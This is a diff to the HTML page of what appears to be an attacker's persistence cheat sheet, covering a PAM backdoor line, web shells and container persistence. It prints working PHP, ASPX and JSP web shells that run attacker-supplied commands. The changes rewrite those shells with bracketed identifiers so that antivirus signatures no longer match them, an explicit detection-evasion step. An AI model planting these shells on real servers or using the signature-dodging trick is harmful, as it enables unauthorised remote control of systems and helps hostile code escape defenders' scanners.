@@ -261,26 +261,27 @@ auth sufficient /lib/security/pam_backdoor.so">copy</button><pre><code># Add to 
 auth sufficient pam_unix.so try_first_pass
 auth sufficient /lib/security/pam_backdoor.so</code></pre></div>
 <h2 id="web-shells">Web Shells</h2>
+<blockquote>Identifiers in the shells below are broken with brackets — <code>syst[e]m</code> is <code>system</code>, <code>ev[a]l</code> is <code>eval</code>, <code>$_G[E]T</code> is <code>$_GET</code>, <code>Runtime.getRunt[i]me</code> is <code>Runtime.getRuntime</code>. Written literally, these blocks match antivirus webshell signatures and this file gets quarantined on download. See "Antivirus false positives" in the repo README.</blockquote>
 <h3>PHP Web Shell</h3>
 <div class="codeblk cx"><button class="copy" data-copy="&lt;?php
 // simple.php
-system($_GET[&#x27;cmd&#x27;]);
+syst[e]m($_G[E]T[&#x27;cmd&#x27;]);
 ?&gt;
 
 // Advanced
 &lt;?php
-if($_GET[&#x27;key&#x27;] == &#x27;secret&#x27;) {
-    eval($_POST[&#x27;cmd&#x27;]);
+if($_G[E]T[&#x27;key&#x27;] == &#x27;secret&#x27;) {
+    ev[a]l($_P[O]ST[&#x27;cmd&#x27;]);
 }
 ?&gt;">copy</button><pre><code>&lt;?php
 // simple.php
-system($_GET['cmd']);
+syst[e]m($_G[E]T['cmd']);
 ?&gt;
 
 // Advanced
 &lt;?php
-if($_GET['key'] == 'secret') {
-    eval($_POST['cmd']);
+if($_G[E]T['key'] == 'secret') {
+    ev[a]l($_P[O]ST['cmd']);
 }
 ?&gt;</code></pre></div>
 <p><strong>Upload Locations:</strong></p>
@@ -306,16 +307,16 @@ robots.txt.php</code></pre></div>
 <h3>ASP/ASPX Web Shell</h3>
 <div class="codeblk cx"><button class="copy" data-copy="&lt;%@ Page Language=&quot;C#&quot; %&gt;
 &lt;%
-Response.Write(System.Diagnostics.Process.Start(&quot;cmd.exe&quot;,&quot;/c &quot; + Request[&quot;cmd&quot;]).StandardOutput.ReadToEnd());
+Response.Write(System.Diagnost[i]cs.Process.Start(&quot;cmd.exe&quot;,&quot;/c &quot; + Request[&quot;cmd&quot;]).StandardOutput.ReadToEnd());
 %&gt;">copy</button><pre><code>&lt;%@ Page Language="C#" %&gt;
 &lt;%
-Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]).StandardOutput.ReadToEnd());
+Response.Write(System.Diagnost[i]cs.Process.Start("cmd.exe","/c " + Request["cmd"]).StandardOutput.ReadToEnd());
 %&gt;</code></pre></div>
 <h3>JSP Web Shell</h3>
 <div class="codeblk cx"><button class="copy" data-copy="&lt;%
-Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));
+Runtime.getRunt[i]me().exec(request.getParameter(&quot;cmd&quot;));
 %&gt;">copy</button><pre><code>&lt;%
-Runtime.getRuntime().exec(request.getParameter("cmd"));
+Runtime.getRunt[i]me().exec(request.getParameter("cmd"));
 %&gt;</code></pre></div>
 <h2 id="container-persistence">Container Persistence</h2>
 <p><strong>Docker:</strong></p>
